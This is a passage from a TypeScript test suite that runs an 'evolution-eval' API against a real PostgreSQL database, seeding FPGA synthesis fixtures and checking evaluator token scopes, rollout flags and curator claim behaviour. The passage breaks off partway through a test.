/**
 * Evolution-eval R1 route gate.
 *
 * This suite deliberately stops at claim/prepare/workspace/recover.  Submit,
 * status, cancel and evidence are R2 contracts and must not be guessed here.
 */

import { afterAll, beforeAll, beforeEach, describe, expect, test } from "bun:test";
import { randomBytes, randomUUID } from "node:crypto";
import { connect } from "node:net";
import { Client } from "pg";
import type { ConnectorPort } from "../src/api/connector-port.ts";
import { startSynthiaServer } from "../src/api/server.ts";
import type { RuntimeClient } from "../src/api/task-proxy.ts";
import { canonicalEvolutionEvalSealedInputProjection } from "../src/domain/evolution-eval.ts";
import { sha256Hex } from "../src/hashing.ts";
import {
  apiCall,
  setupApiHarness,
  teardownApiHarness,
  type ApiHarness,
} from "./support/api-harness.ts";

const DATABASE_URL = process.env.DATABASE_URL ?? "";
const hash = (value: string | Uint8Array): string => sha256Hex(value);
const record = (value: unknown): Record<string, unknown> => value as Record<string, unknown>;
const responseData = (value: unknown): Record<string, unknown> => record(record(value).data);
const responseError = (value: unknown): Record<string, unknown> => record(record(value).error);

interface ClaimableFixture {
  readonly suffix: string;
  readonly projectId: string;
  readonly taskId: string;
  readonly runId: string;
  readonly applicationId: string;
  readonly versionId: string;
  readonly sourcePath: string;
  readonly sourceCommit: string;
  readonly sourceContent: string;
}

interface ClaimedFixture extends ClaimableFixture {
  readonly leaseToken: string;
  readonly evidenceSnapshotHash: string;
  readonly evalInputRef: string;
  readonly inputManifestHash: string;
  readonly sourceManifestHash: string;
  readonly evalRecovery: Record<string, unknown>;
}

describe.skipIf(!DATABASE_URL)("Evolution-eval R1 API — real PostgreSQL", () => {
  let harness: ApiHarness;
  let testDatabaseUrl = "";
  let databaseName = "";
  let evaluatorToken = "";
  let curatorToken = "";
  let mixedEvaluatorToken = "";
  let duplicateEvaluatorToken = "";
  let connectorCalls = 0;

  beforeAll(async () => {
    const base = new URL(DATABASE_URL);
    databaseName = `synthia_eval_api_${randomUUID().replaceAll("-", "")}`;
    const admin = new Client({ connectionString: base.toString() });
    await admin.connect();
    await admin.query(`CREATE DATABASE ${databaseName}`);
    await admin.end();
    base.pathname = `/${databaseName}`;
    testDatabaseUrl = base.toString();

    const runtimeClient: RuntimeClient = {
      createTask: async (body) => ({ agent_id: String(body.task_id ?? "unused") }),
      startTask: async () => ({ started: true, status: "running" }),
      listTasks: async () => ({ agents: [] }),
      getTask: async (agentId) => ({
        agent_id: agentId,
        project_id: "unused",
        status: "running",
        kind: "main",
      }),
      sendMessage: async () => ({ accepted: true }),
      abortTask: async () => ({ aborted: true }),
      streamTask: async () => new Response("event: done\ndata: {}\n\n"),
    };
    const connector: ConnectorPort = {
      connectorId: "evolution-eval-r1-spy",
      discover: async () => {
        connectorCalls += 1;
        return { capabilities: [], drift: false };
      },
      submitJob: async (params) => {
        connectorCalls += 1;
        return { jobId: params.jobId, state: "queued" };
      },
      queryStatus: async (_projectId, jobId) => {
        connectorCalls += 1;
        return { jobId, state: "submitted" };
      },
      fetchEvidence: async (_projectId, jobId) => {
        connectorCalls += 1;
        return { jobId, entries: [] };
      },
      fetchEvidenceContent: async (_projectId, _jobId, name) => {
        connectorCalls += 1;
        return {
          name,
          content: "",
          sha256: hash(""),
          truncated: false,
          mediaType: "text/plain",
        };
      },
    };
    harness = await setupApiHarness(testDatabaseUrl, {
      features: { selfEvolution: true, evolutionEvalExecution: true },
      runtimeClient,
      connector,
    });

    const identity = await harness.client.query(
      "SELECT id FROM user_account WHERE uid=$1",
      [harness.ids.serviceUid],
    );
    const userId = String(identity.rows[0]!.id);
    evaluatorToken = randomBytes(32).toString("hex");
    curatorToken = randomBytes(32).toString("hex");
    mixedEvaluatorToken = randomBytes(32).toString("hex");
    duplicateEvaluatorToken = randomBytes(32).toString("hex");
    await harness.client.query(
      `INSERT INTO auth_token(token_hash,user_id,scope) VALUES
       ($1,$5,ARRAY['core:evolution-eval']),
       ($2,$5,ARRAY['core:evolution-curator']),
       ($3,$5,ARRAY['core:evolution-eval','core:read']),
       ($4,$5,ARRAY['core:evolution-eval','core:evolution-eval'])`,
      [
        hash(evaluatorToken),
        hash(curatorToken),
        hash(mixedEvaluatorToken),
        hash(duplicateEvaluatorToken),
        userId,
      ],
    );
  });

  beforeEach(async () => {
    connectorCalls = 0;
    await harness.client.query(
      `TRUNCATE project,curator_run,learned_skill,learning_episode,
                outbox_events,idempotency_records
       RESTART IDENTITY CASCADE`,
    );
    await harness.client.query(
      `UPDATE evolution_settings
          SET learning_paused=false,learned_skills_enabled=true
        WHERE singleton_id='global'`,
    );
  });

  afterAll(async () => {
    if (harness) await teardownApiHarness(harness);
    if (databaseName) {
      const admin = new Client({ connectionString: DATABASE_URL });
      await admin.connect();
      await admin.query(`DROP DATABASE IF EXISTS ${databaseName} WITH (FORCE)`);
      await admin.end();
    }
  });

  async function seedClaimable(
    label: string,
    options: {
      readonly mode?: "run" | "dry_run";
      readonly sourcePath?: string;
    } = {},
  ): Promise<ClaimableFixture> {
    const suffix = `${label}_${randomUUID().replaceAll("-", "").slice(0, 10)}`;
    const projectId = `project_${suffix}`;
    const parentTaskId = `project_agent_${suffix}`;
    const taskId = `source_task_${suffix}`;
    const workspaceId = `source_workspace_${suffix}`;
    const resultId = `source_result_${suffix}`;
    const episodeId = `episode_${suffix}`;
    const originRunId = `curator_origin_${suffix}`;
    const runId = `curator_eval_${suffix}`;
    const skillId = `skill_${suffix}`;
    const versionId = `version_${suffix}`;
    const skillFileId = `skill_file_${suffix}`;
    const applicationId = `application_${suffix}`;
    const applicationSkillId = `application_skill_${suffix}`;
    const eventId = `event_${suffix}`;
    const sourceFileId = `source_file_${suffix}`;
    const sourcePath = options.sourcePath ?? "rtl/top.sv";
    const sourceContent = "module top; endmodule\n";
    const sourceCommit = "a".repeat(40);
    const skillContent = "# Timing recovery\n\nUse typed Vivado operations only.\n";
    const eventPayload = {
      tool_call_id: `tool_call_${suffix}`,
      name: "learned_skill_apply",
      args: {
        version_id: versionId,
        local_goal: "synthesize the sealed FPGA snapshot",
        reason_codes: ["matching-failure"],
        role: "primary",
      },
    };

    await harness.client.query("BEGIN");
    try {
      await harness.client.query("SET CONSTRAINTS ALL DEFERRED");
      await harness.client.query(
        `INSERT INTO project
          (id,name,scope,project_type,process_version_id,process_profile_id,
           process_profile_version,process_profile_name,target_part,toolchain_profile_ref,status)
         VALUES ($1,$2,'','free',NULL,NULL,NULL,NULL,'xc7a35tcpg236-1',$3,'active')`,
        [projectId, `Eval ${suffix}`, hash(`toolchain:${suffix}`)],
      );
      await harness.client.query(
        `INSERT INTO role_assignment(id,project_id,actor_type,actor_id,role,permissions)
         VALUES ($1,$2,'service',$3,'evolution-evaluator','{}'::jsonb)`,
        [`role_${suffix}`, projectId, harness.ids.serviceUid],
      );
      await harness.client.query(
        `INSERT INTO curator_run
          (id,mode,state,schedule_bucket,manual_key,reason,terminal_request_hash,
           terminal_result,created_by_type,created_by,completed_at)
         VALUES ($1,'run','completed',$1,$1,'version provenance',$2,$3::jsonb,
                 'service',$4,now())`,
        [
          originRunId,
          hash(`origin:${suffix}`),
          JSON.stringify({ schema: "curator-result.v1", run_id: originRunId }),
          harness.ids.serviceUid,
        ],
      );
      await harness.client.query(
        `INSERT INTO curator_run
          (id,mode,state,schedule_bucket,manual_key,reason,created_by_type,created_by)
         VALUES ($1,$2,'queued',$1,$1,'R1 route test','service',$3)`,
        [runId, options.mode ?? "run", harness.ids.serviceUid],
      );
      await harness.client.query(
        `INSERT INTO learned_skill
          (id,slug,name,summary,applicability_summary,created_by_type,created_by)
         VALUES ($1,$2,'Timing recovery','Recover synthesis failures','FPGA synthesis',
                 'service',$3)`,
        [skillId, `skill-${suffix.replaceAll("_", "-")}`, harness.ids.serviceUid],
      );
      await harness.client.query(
        `INSERT INTO learned_skill_version
          (id,skill_id,version_no,parent_version_id,description,applicability,
           outcome_contract,content_manifest_hash,scanner_version,scan_decision,
           scan_findings,curator_run_id,created_by_type,created_by)
         VALUES ($1,$2,1,NULL,'Typed synthesis recovery','{}'::jsonb,'{}'::jsonb,
                 $3,'test-scanner-v1','pass','[]'::jsonb,$4,'service',$5)`,
        [versionId, skillId, hash(`skill-manifest:${skillContent}`), originRunId, harness.ids.serviceUid],
      );
      await harness.client.query(
        `INSERT INTO learned_skill_version_status(version_id,quality_state)
         VALUES ($1,'active_unproven')`,
        [versionId],
      );
      await harness.client.query(
        `INSERT INTO learned_skill_file
          (id,version_id,path,kind,language,sha256,size_bytes,media_type,content)
         VALUES ($1,$2,'SKILL.md','skill_md',NULL,$3,$4,'text/markdown',$5)`,
        [skillFileId, versionId, hash(skillContent), Buffer.byteLength(skillContent), skillContent],
      );
      await harness.client.query(
        "UPDATE learned_skill SET active_version_id=$2 WHERE id=$1",
        [skillId, versionId],
      );
      await harness.client.query(
        `INSERT INTO agent_task
          (id,project_id,project_type,kind,agent_role,parent_task_id,workspace_id,
           process_instance_id,runtime_agent_id,runtime_actor_id,objective,
           authorization_scope,status,input_hash,adoption_state,created_by_type,created_by)
         VALUES ($1,$2,'free','main','project',NULL,NULL,NULL,$1,$3,
                 'project agent','{}'::jsonb,'running',$4,'not_applicable','service',$3)`,
        [parentTaskId, projectId, harness.ids.serviceUid, hash(`parent-input:${suffix}`)],
      );
      await harness.client.query(
        `INSERT INTO agent_task
          (id,project_id,project_type,kind,agent_role,parent_task_id,workspace_id,
           process_instance_id,runtime_agent_id,runtime_actor_id,objective,
           authorization_scope,status,input_hash,output_hash,adoption_state,
           created_by_type,created_by,finished_at)
         VALUES ($1,$2,'free','side','side',$3,$4,NULL,$1,$5,
                 'fix synthesis','{}'::jsonb,'succeeded',$6,$7,'available',
                 'service',$5,now())`,
        [
          taskId,
          projectId,
          parentTaskId,
          workspaceId,
          harness.ids.serviceUid,
          hash(`task-input:${suffix}`),
          hash(`task-output:${suffix}`),
        ],
      );
      await harness.client.query(
        `INSERT INTO task_workspace
          (id,task_id,project_id,state,storage_key,base_commit,base_manifest_hash,
           head_commit,sealed_at)
         VALUES ($1,$2,$3,'sealed',$4,$5,$6,$7,now())`,
        [
          workspaceId,
          taskId,
          projectId,
          `eval-${suffix}`,
          "b".repeat(40),
          hash(`base-manifest:${suffix}`),
          sourceCommit,
        ],
      );
      await harness.client.query(
        `INSERT INTO task_conversation_event
          (id,project_id,task_id,sequence,event_kind,payload,payload_hash,actor_type,actor_id)
         VALUES ($1,$2,$3,1,'tool_call',$4::jsonb,$5,'service',$6)`,
        [eventId, projectId, taskId, JSON.stringify(eventPayload), hash(JSON.stringify(eventPayload)), harness.ids.serviceUid],
      );
      await harness.client.query(
        `INSERT INTO task_workspace_file
          (id,task_id,project_id,workspace_id,path,artifact_type,change_kind,
           base_content_hash,content_hash,content_text,size_bytes,workspace_commit,version)
         VALUES ($1,$2,$3,$4,$5,'hdl','added',NULL,$6,$7,$8,$9,1)`,
        [
          sourceFileId,
          taskId,
          projectId,
          workspaceId,
          sourcePath,
          hash(sourceContent),
          sourceContent,
          Buffer.byteLength(sourceContent),
          sourceCommit,
        ],
      );
      await harness.client.query(
        `INSERT INTO task_result
          (id,project_id,task_id,workspace_id,base_commit,result_commit,summary,
           tests,manifest,output_hash,created_by_type,created_by)
         VALUES ($1,$2,$3,$4,$5,$6,'sealed source','[]'::jsonb,$7::jsonb,$8,
                 'service',$9)`,
        [
          resultId,
          projectId,
          taskId,
          workspaceId,
          "b".repeat(40),
          sourceCommit,
          JSON.stringify({ files: [{ path: sourcePath, sha256: hash(sourceContent) }] }),
          hash(`result:${suffix}`),
          harness.ids.serviceUid,
        ],
      );
      await harness.client.query(
        `INSERT INTO learning_episode
          (id,project_id,task_id,observation_key,episode_key,end_event_sequence,
           content_hash,outcome_claim,evidence_refs,created_by_type,created_by)
         VALUES ($1,$2,$3,$4,$5,1,$6,'synthesis fixed','[]'::jsonb,'service',$7)`,
        [
          episodeId,
          projectId,
          taskId,
          `observation:${suffix}`,
          `episode:${suffix}`,
          hash(`episode:${suffix}`),
          harness.ids.serviceUid,
        ],
      );
      await harness.client.query(
        `INSERT INTO skill_application
          (id,project_id,task_id,observation_key,episode_id,local_goal,state,
           primary_tool_call_id,start_event_sequence,end_event_sequence,outcome_claim,
           human_corrections,evidence_refs,tool_run_refs,closed_at,created_by_type,created_by)
         VALUES ($1,$2,$3,$4,$5,'synthesize the sealed FPGA snapshot','pending_evaluation',
                 $6,1,1,'synthesis fixed',0,'[]'::jsonb,'[]'::jsonb,now(),'service',$7)`,
        [
          applicationId,
          projectId,
          taskId,
          `observation:${suffix}`,
          episodeId,
          `tool_call_${suffix}`,
          harness.ids.serviceUid,
        ],
      );
      await harness.client.query(
        `INSERT INTO skill_application_skill
          (id,application_id,skill_id,version_id,role,tool_call_id,reason_codes)
         VALUES ($1,$2,$3,$4,'primary',$5,'["matching-failure"]'::jsonb)`,
        [applicationSkillId, applicationId, skillId, versionId, `tool_call_${suffix}`],
      );
      await harness.client.query("COMMIT");
    } catch (error) {
      await harness.client.query("ROLLBACK");
      throw error;
    }

    return {
      suffix,
      projectId,
      taskId,
      runId,
      applicationId,
      versionId,
      sourcePath,
      sourceCommit,
      sourceContent,
    };
  }

  async function rawApiCallWithHeader(
    path: string,
    headerName: string,
    headerValue: string,
    body: Record<string, unknown>,
  ): Promise<{ readonly status: number; readonly json: unknown }> {
    return await new Promise((resolve, reject) => {
      const bodyBytes = Buffer.from(JSON.stringify(body), "utf8");
      const chunks: Buffer[] = [];
      const socket = connect({ host: harness.server.hostname, port: harness.server.port }, () => {
        const request = Buffer.concat([
          Buffer.from(
            `POST ${path} HTTP/1.1\r\nHost: ${harness.server.hostname}:${harness.server.port}\r\n`
            + `Authorization: Bearer ${evaluatorToken}\r\nContent-Type: application/json\r\n`
            + `Content-Length: ${bodyBytes.byteLength}\r\n${headerName}: `,
            "ascii",
          ),
          Buffer.from(headerValue, "utf8"),
          Buffer.from("\r\nConnection: close\r\n\r\n", "ascii"),
          bodyBytes,
        ]);
        socket.end(request);
      });
      socket.setTimeout(5_000, () => socket.destroy(new Error("raw HTTP test timed out")));
      socket.on("data", (chunk) => chunks.push(Buffer.from(chunk)));
      socket.on("error", reject);
      socket.on("end", () => {
        const response = Buffer.concat(chunks).toString("utf8");
        const [head = "", rawBody = ""] = response.split("\r\n\r\n", 2);
        const status = Number(/^HTTP\/1\.1 (\d{3})/m.exec(head)?.[1] ?? 0);
        let json: unknown = null;
        try {
          json = JSON.parse(rawBody);
        } catch {
          json = rawBody;
        }
        resolve({ status, json });
      });
    });
  }

  async function claimFixture(fixture: ClaimableFixture): Promise<ClaimedFixture> {
    const response = await apiCall(
      harness.baseUrl,
      "/api/v1/internal/evolution/curator-runs/claim-manual",
      {
        method: "POST",
        token: curatorToken,
        body: { worker_id: `worker-${fixture.suffix}`, lease_seconds: 900 },
      },
    );
    expect(response.status).toBe(200);
    const run = record(responseData(response.json).run);
    expect(run.run_id).toBe(fixture.runId);
    const bundle = (run.applications as unknown[])
      .map(record)
      .find((candidate) => record(candidate.application).application_id === fixture.applicationId);
    expect(bundle).toBeDefined();
    const evalInput = record(bundle!.eval_input);
    expect(evalInput.eval_input_ref).toEqual(expect.any(String));
    return {
      ...fixture,
      leaseToken: String(run.lease_token),
      evidenceSnapshotHash: String(bundle!.evidence_snapshot_hash),
      evalInputRef: String(evalInput.eval_input_ref),
      inputManifestHash: String(evalInput.input_manifest_hash),
      sourceManifestHash: String(evalInput.source_manifest_hash),
      evalRecovery: record(run.eval_recovery),
    };
  }

  function prepareBody(claim: ClaimedFixture): Record<string, unknown> {
    return {
      schema: "evolution-eval-prepare.v1",
      curator_lease_token: claim.leaseToken,
      application_id: claim.applicationId,
      evidence_snapshot_hash: claim.evidenceSnapshotHash,
      version_id: claim.versionId,
      eval_input_ref: claim.evalInputRef,
      input_manifest_hash: claim.inputManifestHash,
      operation: "synthesize",
      parameters: {
        operation: "synthesize",
        source_paths: [claim.sourcePath],
        top: "top",
        part: "xc7a35tcpg236-1",
      },
      timeout_ms: 60_000,
    };
  }

  async function prepare(
    claim: ClaimedFixture,
    key: string,
    body: Record<string, unknown> = prepareBody(claim),
  ) {
    return await apiCall(
      harness.baseUrl,
      `/api/v1/internal/evolution/curator-runs/${claim.runId}/eval-jobs/prepare`,
      {
        method: "POST",
        token: evaluatorToken,
        headers: { "idempotency-key": key },
        body,
      },
    );
  }

  async function terminalizeSubmitted(evalJobId: string): Promise<void> {
    const jobResult = await harness.client.query(
      `SELECT j.curator_run_id,j.project_id,j.tool_run_id,j.operation,t.correlation_id
         FROM evolution_eval_job j
         JOIN tool_run t ON t.id=j.tool_run_id
        WHERE j.id=$1`,
      [evalJobId],
    );
    const job = jobResult.rows[0]!;
    const transitionAuditId = `audit_transition_${randomUUID()}`;
    const transitionOutboxId = randomUUID();
    const transitionFactId = `transition_${randomUUID()}`;
    const tombstoneAuditId = `audit_tombstone_${randomUUID()}`;
    const tombstoneOutboxId = randomUUID();
    const reasonCode = "EVOLUTION_EVAL_CANCELLED_BEFORE_DISPATCH";
    const errorHash = hash(`tombstone:${evalJobId}`);

    await harness.client.query("BEGIN");
    try {
      const sequenceResult = await harness.client.query(
        `SELECT COALESCE(max(sequence),0)::int AS sequence
           FROM outbox_events
          WHERE aggregate_type='evolution_eval_job' AND aggregate_id=$1`,
        [evalJobId],
      );
      const nextSequence = Number(sequenceResult.rows[0]!.sequence) + 1;
      await harness.client.query(
        `INSERT INTO evolution_eval_audit_event
          (id,curator_run_id,eval_job_id,project_id,event_type,actor_type,actor_id,
           correlation_id,from_state,to_state,operation)
         VALUES ($1,$2,$3,$4,'tool_run_transition','service',$5,$6,
                 'submitted','rejected',$7)`,
        [
          transitionAuditId,
          job.curator_run_id,
          evalJobId,
          job.project_id,
          harness.ids.serviceUid,
          job.correlation_id,
          job.operation,
        ],
      );
      await harness.client.query(
        `INSERT INTO outbox_events
          (event_id,aggregate_type,aggregate_id,sequence,event_type,project_id,payload,
           correlation_id,classification)
         VALUES ($1,'evolution_eval_job',$2,$3,'evolution_eval.tool_run_transition',$4,
                 $5::jsonb,$6,'D1')`,
        [
          transitionOutboxId,
          evalJobId,
          nextSequence,
          job.project_id,
          JSON.stringify({ from_state: "submitted", to_state: "rejected" }),
          job.correlation_id,
        ],
      );
      await harness.client.query(
        `INSERT INTO evolution_eval_transition_fact
          (id,eval_job_id,transition_sequence,from_state,to_state,audit_event_id,outbox_event_id)
         VALUES ($1,$2,1,'submitted','rejected',$3,$4)`,
        [transitionFactId, evalJobId, transitionAuditId, transitionOutboxId],
      );
      await harness.client.query(
        `UPDATE tool_run
            SET state='rejected',error_code=$2,end_time=now()
          WHERE id=$1`,
        [job.tool_run_id, reasonCode],
      );
      await harness.client.query(
        `INSERT INTO evolution_eval_audit_event
          (id,curator_run_id,eval_job_id,project_id,event_type,actor_type,actor_id,
           correlation_id,request_hash,operation,error_code)
         VALUES ($1,$2,$3,$4,'dispatch_tombstone','service',$5,$6,$7,$8,$9)`,
        [
          tombstoneAuditId,
          job.curator_run_id,
          evalJobId,
          job.project_id,
          harness.ids.serviceUid,
          job.correlation_id,
          errorHash,
          job.operation,
          reasonCode,
        ],
      );
      await harness.client.query(
        `INSERT INTO outbox_events
          (event_id,aggregate_type,aggregate_id,sequence,event_type,project_id,payload,
           correlation_id,classification)
         VALUES ($1,'evolution_eval_job',$2,$3,'evolution_eval.dispatch_tombstoned',$4,
                 $5::jsonb,$6,'D1')`,
        [
          tombstoneOutboxId,
          evalJobId,
          nextSequence + 1,
          job.project_id,
          JSON.stringify({ error_hash: errorHash }),
          job.correlation_id,
        ],
      );
      await harness.client.query(
        `INSERT INTO evolution_eval_dispatch_tombstone
          (eval_job_id,reason_code,error_hash,audit_event_id,outbox_event_id)
         VALUES ($1,$2,$3,$4,$5)`,
        [evalJobId, reasonCode, errorHash, tombstoneAuditId, tombstoneOutboxId],
      );
      await harness.client.query("COMMIT");
    } catch (error) {
      await harness.client.query("ROLLBACK");
      throw error;
    }
  }

  async function sealDispatchAndAdvanceToRunning(evalJobId: string): Promise<void> {
    const result = await harness.client.query(
      `SELECT j.*,t.correlation_id,r.manifest,r.manifest_hash,r.file_count,r.total_bytes,
              p.current_revision
         FROM evolution_eval_job j
         JOIN tool_run t ON t.id=j.tool_run_id
         JOIN evolution_eval_workspace_projection p ON p.workspace_id=j.workspace_id
         JOIN evolution_eval_workspace_revision r
           ON r.workspace_id=p.workspace_id AND r.revision=p.current_revision
        WHERE j.id=$1`,
      [evalJobId],
    );
    const job = result.rows[0]!;
    const dispatchHash = hash(`dispatch:${evalJobId}`);
    const sealedInputProjectionHash = canonicalEvolutionEvalSealedInputProjection(job.manifest).sha256;
    const dispatchAuditId = `audit_dispatch_${randomUUID()}`;
    const dispatchOutboxId = randomUUID();
    const sealFactId = `operation_seal_${randomUUID()}`;
    const sealAuditId = `audit_seal_${randomUUID()}`;
    const sealOutboxId = randomUUID();

    await harness.client.query("BEGIN");
    try {
      const sequenceResult = await harness.client.query(
        `SELECT COALESCE(max(sequence),0)::int AS sequence
           FROM outbox_events
          WHERE aggregate_type='evolution_eval_job' AND aggregate_id=$1`,
        [evalJobId],
      );
      let sequence = Number(sequenceResult.rows[0]!.sequence);
      await harness.client.query(
        `INSERT INTO evolution_eval_audit_event
          (id,curator_run_id,eval_job_id,project_id,event_type,actor_type,actor_id,
           correlation_id,request_hash,operation,workspace_manifest_hash)
         VALUES ($1,$2,$3,$4,'dispatch_sealed','service',$5,$6,$7,$8,$9)`,
        [
          dispatchAuditId,
          job.curator_run_id,
          evalJobId,
          job.project_id,
          harness.ids.serviceUid,
          job.correlation_id,
          dispatchHash,
          job.operation,
          job.manifest_hash,
        ],
      );
      await harness.client.query(
        `INSERT INTO outbox_events
          (event_id,aggregate_type,aggregate_id,sequence,event_type,project_id,payload,
           correlation_id,classification)
         VALUES ($1,'evolution_eval_job',$2,$3,'evolution_eval.dispatch_requested',$4,
                 $5::jsonb,$6,'D1')`,
        [
          dispatchOutboxId,
          evalJobId,
          ++sequence,
          job.project_id,
          JSON.stringify({ dispatch_request_hash: dispatchHash }),
          job.correlation_id,
        ],
      );
      await harness.client.query(
        `INSERT INTO evolution_eval_dispatch
          (eval_job_id,workspace_id,workspace_revision,workspace_manifest_hash,
           sealed_input_projection_hash,dispatch_request_hash,requested_timeout_ms,deadline_at,
           audit_event_id,outbox_event_id)
         VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10)`,
        [
          evalJobId,
          job.workspace_id,
          job.current_revision,
          job.manifest_hash,
          sealedInputProjectionHash,
          dispatchHash,
          job.requested_timeout_ms,
          job.deadline_at,
          dispatchAuditId,
          dispatchOutboxId,
        ],
      );
      await harness.client.query(
        `UPDATE evolution_eval_workspace_projection
            SET sealed_at=now(),updated_at=now()
          WHERE workspace_id=$1`,
        [job.workspace_id],
      );
      await harness.client.query(
        `INSERT INTO evolution_eval_audit_event
          (id,curator_run_id,eval_job_id,project_id,event_type,actor_type,actor_id,
           correlation_id,operation,workspace_manifest_hash,file_count,byte_count)
         VALUES ($1,$2,$3,$4,'workspace_sealed','service',$5,$6,$7,$8,$9,$10)`,
        [
          sealAuditId,
          job.curator_run_id,
          evalJobId,
          job.project_id,
          harness.ids.serviceUid,
          job.correlation_id,
          job.operation,
          job.manifest_hash,
          job.file_count,
          job.total_bytes,
        ],
      );
      await harness.client.query(
        `INSERT INTO outbox_events
          (event_id,aggregate_type,aggregate_id,sequence,event_type,project_id,payload,
           correlation_id,classification)
         VALUES ($1,'evolution_eval_job',$2,$3,'evolution_eval.workspace_sealed',$4,
                 $5::jsonb,$6,'D1')`,
        [
          sealOutboxId,
          evalJobId,
          ++sequence,
          job.project_id,
          JSON.stringify({
            fact_id: sealFactId,
            workspace_id: job.workspace_id,
            revision: Number(job.current_revision),
            workspace_manifest_hash: job.manifest_hash,
            file_count: Number(job.file_count),
            byte_count: Number(job.total_bytes),
          }),
          job.correlation_id,
        ],
      );
      await harness.client.query(
        `INSERT INTO evolution_eval_operation_fact
          (id,eval_job_id,fact_type,workspace_id,workspace_revision,
           workspace_manifest_hash,audit_event_id,outbox_event_id)
         VALUES ($1,$2,'workspace_seal',$3,$4,$5,$6,$7)`,
        [
          sealFactId,
          evalJobId,
          job.workspace_id,
          job.current_revision,
          job.manifest_hash,
          sealAuditId,
          sealOutboxId,
        ],
      );

      const transitions = [
        ["submitted", "queued"],
        ["queued", "preparing"],
        ["preparing", "running"],
      ] as const;
      for (const [index, [fromState, toState]] of transitions.entries()) {
        const auditId = `audit_transition_${index}_${randomUUID()}`;
        const outboxId = randomUUID();
        const factId = `transition_${index}_${randomUUID()}`;
        await harness.client.query(
          `INSERT INTO evolution_eval_audit_event
            (id,curator_run_id,eval_job_id,project_id,event_type,actor_type,actor_id,
             correlation_id,from_state,to_state,operation)
           VALUES ($1,$2,$3,$4,'tool_run_transition','service',$5,$6,$7,$8,$9)`,
          [
            auditId,
            job.curator_run_id,
            evalJobId,
            job.project_id,
            harness.ids.serviceUid,
            job.correlation_id,
            fromState,
            toState,
            job.operation,
          ],
        );
        await harness.client.query(
          `INSERT INTO outbox_events
            (event_id,aggregate_type,aggregate_id,sequence,event_type,project_id,payload,
             correlation_id,classification)
           VALUES ($1,'evolution_eval_job',$2,$3,'evolution_eval.tool_run_transition',$4,
                   $5::jsonb,$6,'D1')`,
          [
            outboxId,
            evalJobId,
            ++sequence,
            job.project_id,
            JSON.stringify({ from_state: fromState, to_state: toState }),
            job.correlation_id,
          ],
        );
        await harness.client.query(
          `INSERT INTO evolution_eval_transition_fact
            (id,eval_job_id,transition_sequence,from_state,to_state,audit_event_id,outbox_event_id)
           VALUES ($1,$2,$3,$4,$5,$6,$7)`,
          [factId, evalJobId, index + 1, fromState, toState, auditId, outboxId],
        );
        await harness.client.query(
          `UPDATE tool_run
              SET state=$2::tool_run_state,
                  start_time=CASE WHEN $2::text='running' THEN now() ELSE start_time END
            WHERE id=$1`,
          [job.tool_run_id, toState],
        );
      }
      await harness.client.query("COMMIT");
    } catch (error) {
      await harness.client.query("ROLLBACK");
      throw error;
    }
  }

  test("exact evaluator capability is isolated from Curator and generic project routes", async () => {
    const fixture = await seedClaimable("scope");
    const claim = await claimFixture(fixture);
    const evalPath = `/api/v1/internal/evolution/curator-runs/${claim.runId}/eval-jobs/prepare`;
    const authCases = [
      { token: null, status: 401 },
      { token: "unknown-token", status: 401 },
      { token: harness.ids.expiredToken, status: 401 },
      { token: harness.ids.revokedToken, status: 401 },
      { token: mixedEvaluatorToken, status: 403, code: "EVOLUTION_SCOPE_FORBIDDEN" },
      { token: duplicateEvaluatorToken, status: 403, code: "EVOLUTION_SCOPE_FORBIDDEN" },
      { token: curatorToken, status: 403 },
    ];
    for (const [index, authCase] of authCases.entries()) {
      const response = await apiCall(harness.baseUrl, evalPath, {
        method: "POST",
        token: authCase.token,
        headers: { "idempotency-key": `scope-${index}` },
        body: prepareBody(claim),
      });
      expect(response.status).toBe(authCase.status);
      if (authCase.code) expect(responseError(response.json).code).toBe(authCase.code);
    }

    const evaluatorOnCurator = await apiCall(
      harness.baseUrl,
      "/api/v1/internal/evolution/curator-runs/claim-manual",
      {
        method: "POST",
        token: evaluatorToken,
        body: { worker_id: "forbidden", lease_seconds: 30 },
      },
    );
    expect(evaluatorOnCurator.status).toBe(403);

    const genericCalls = [
      apiCall(harness.baseUrl, `/api/v1/projects/${fixture.projectId}/jobs`, {
        method: "POST",
        token: evaluatorToken,
        body: { operation: "synthesize", run_class: "exploratory" },
      }),
      apiCall(harness.baseUrl, `/api/v1/projects/${fixture.projectId}/jobs/missing`, {
        method: "GET",
        token: evaluatorToken,
      }),
      apiCall(harness.baseUrl, `/api/v1/projects/${fixture.projectId}/workspace/tree`, {
        method: "GET",
        token: evaluatorToken,
      }),
      apiCall(harness.baseUrl, `/api/v1/projects/${fixture.projectId}/workspace/file`, {
        method: "PUT",
        token: evaluatorToken,
        body: { path: "rtl/top.sv", content: "forbidden" },
      }),
    ];
    const genericResponses = await Promise.all(genericCalls);
    expect(genericResponses.map((response) => response.status)).toEqual([403, 403, 403, 403]);

    const allowed = await prepare(claim, "scope-allowed");
    expect(allowed.status).toBe(201);
    expect(connectorCalls).toBe(0);
  });

  test("eval mutations remain zero-write when execution rollout is off", async () => {
    const claim = await claimFixture(await seedClaimable("eval-rollout-off"));
    const path = `/api/v1/internal/evolution/curator-runs/${claim.runId}/eval-jobs/prepare`;
    for (const features of [
      { selfEvolution: false, evolutionEvalExecution: false },
      { selfEvolution: true, evolutionEvalExecution: false },
    ]) {
      const server = startSynthiaServer(harness.pool, { port: 0, features });
      try {
        const response = await apiCall(
          `http://${server.hostname}:${server.port}`,
          path,
          {
            method: "POST",
            token: evaluatorToken,
            headers: { "idempotency-key": `eval-rollout-off-${features.selfEvolution}` },
            body: prepareBody(claim),
          },
        );
        expect(response.status).toBe(403);
        expect(responseError(response.json).code).toBe("EVOLUTION_EVAL_FORBIDDEN");
      } finally {
        server.stop();
      }
      const writes = await harness.client.query(
        `SELECT
           (SELECT count(*)::int FROM evolution_eval_job WHERE curator_run_id=$1) AS jobs,
           (SELECT count(*)::int FROM evolution_eval_idempotency WHERE curator_run_id=$1) AS idempotency`,
        [claim.runId],
      );
      expect(writes.rows[0]).toEqual({ jobs: 0, idempotency: 0 });
    }
  });

  test("Curator claim fixes the two-hour run/input boundary across reclaim and withholds dry-run or non-portable input", async () => {
    const fixture = await seedClaimable("claim");
    const first = await claimFixture(fixture);
    const firstRun = await harness.client.query(
      `SELECT budget_started_at,deadline_at,max_jobs
         FROM evolution_eval_run WHERE curator_run_id=$1`,
      [fixture.runId],
    );
    expect(firstRun.rows).toHaveLength(1);
    expect(firstRun.rows[0]!.max_jobs).toBe(3);
    expect(
